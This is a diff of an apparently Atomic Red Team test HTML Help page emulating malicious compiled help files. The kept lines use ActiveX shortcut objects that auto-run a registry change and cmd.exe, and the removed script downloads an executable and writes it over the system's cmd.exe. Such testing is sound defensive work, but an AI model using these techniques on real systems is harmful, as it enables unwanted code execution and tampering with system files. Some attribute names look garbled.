@@ -3,33 +3,8 @@
         <title>Atomic Red Team Compiled HTML Help File</title>
 		<OBJECT id=M classid=clsid:adb880a6-deff-11cf-9377-00aa003b7a11><PARAM name=Command value=Close></OBJECT>
 		<object id=hhShortcut type=application/x-oleobject classid=clsid:adb880a6-deff-11cf-9377-00aa003b7a11 STYLE=display:none><param name=Command value=ShortCUt>
-			<param name=Iteml value=',reg,add "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}" /v "Compatibility Flags" It REG_DWORD /d 256 /f'></object>
+			<param name=Iteml value=',reg,add "HKCU\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}" /v "Compatibility Flags" It REG_DWORD /d 256 /f'></object>
 			<object id=hhShortcut2 typenapplication/x-oleobject classid=clsid:adb880a6-deff-11cf-9377-00aa003b7a11 STYLE=display:none><param name=Command value=ShortCut><param name=Iteml value=',cmd.exe'></object>
 			<script>hhShortcut.Click();</script>
     </head>
-	<body>
-		<DIV id="ObjectContainer"></DIV>
-		<SCRIPT>
-		function gs(){
-			var f = unescape('Microsoft.XMLHTTP');
-			var x = new ActiveXObject(f);
-			x.Open("GET", "https://github.com/arntsonl/calc_security_poc/raw/master/exe/calc.exe",0);
-			x.Send();
-			d = unescape('ADODB.Stream');
-			var s = new ActiveXObject(d);
-			s.Mode = 3;
-			s.Type = 1;
-			s.Open();
-			s.Write(x.responseBody);
-			s.SaveToFile("C:\\windows\\system32\\cmd.exe",2);
-		}
-
-		function LaunchExecutable2K(){
-			IShortcut2.Click();
-			M.Click();
-		}
-		setTimeout("gs()",100);
-		setTimeout("LaunchExecutable2K()",100);
-	</script>
-	</body>
 </html>
